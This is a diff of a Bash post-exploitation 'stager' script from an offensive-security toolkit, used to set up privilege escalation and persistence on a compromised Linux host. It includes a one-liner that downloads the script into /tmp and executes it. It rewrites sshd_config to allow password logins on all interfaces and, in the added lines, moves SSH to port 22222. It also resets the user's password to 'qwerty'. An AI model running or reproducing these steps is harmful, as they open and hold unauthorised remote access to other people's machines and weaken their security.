@@ -1,5 +1,5 @@
 #!/bin/bash
-# used to stage all appropriate tools needed for privesc + handles some base config setup
+# used to stage all appropriate tools needed for privesc + handles some base config setup + sets up ideal enviornment for first shell
 # -------------------------------------------------------------------------------------------------------------------------------- 
 # if the target is able to contact github, use the below one liner for the quickest method.
 # cd /tmp/ && wget https://raw.githubusercontent.com/WillChaos/OFFSEC/master/PrivEsc/LinuxStager.sh && chmod +x LinuxStager.sh && ./LinuxStager.sh https://raw.githubusercontent.com/WillChaos/OFFSEC/master/PrivEsc/
@@ -60,7 +60,10 @@ if [ -z "$1" ]
         sed -i 's/PasswordAuthentication no/PasswordAuthentication yes/g' /etc/ssh/sshd_config
     echo "-[*] condfiguring sshd_config to accept connections on all interfaces " 
         sed -i 's/#ListenAddress 0.0.0.0/ListenAddress 0.0.0.0/g' /etc/ssh/sshd_config
+    echo "-[*] condfiguring sshd_config default ssh port to 22222 " 
+        sed -i 's/Port 22/Port 22222/g' /etc/ssh/sshd_config
     echo "-[!] complete."
+    
   else
     echo "-[*] we are not running as root [$USER] - limited options here."
     echo "-[*] resetting password : $USER : qwerty"
